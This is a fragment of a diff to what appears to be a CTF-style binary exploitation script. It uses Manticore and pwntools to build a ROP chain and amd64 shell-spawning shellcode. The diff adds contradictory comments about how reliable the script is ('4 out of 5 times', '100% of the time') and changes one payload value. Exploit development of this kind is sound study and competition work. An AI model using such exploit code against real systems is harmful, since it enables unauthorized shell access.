@@ -5,6 +5,8 @@
 
 # this solution works more often however
 # sometimes the "stack" runs out of space
+# works 4 out of 5 times
+# 100% of the time
 
 from manticore import Manticore
 from subprocess import check_output
@@ -59,7 +61,6 @@ def generate_exploit(magic, addr, last_mov, xors):
     log.info('Crafting final exploit')
 
     b = ELF(path)
-
     r = ROP(b)
     shellcode = asm(shellcraft.amd64.sh())
     
@@ -78,7 +79,7 @@ def generate_exploit(magic, addr, last_mov, xors):
         p64(addr+48+48+91*8+4) +
         p64(ret.address)*4 +
         p64(last_mov) + 
-        p32(0x7) + p64((addr & ~mask) + 0xc00) + 
+        p32(0x7) + p64(0x0) + 
         p64(pop_rdi.address) + 
         p64(addr & ~mask) + 
         p64(pop_rsi.address) + 
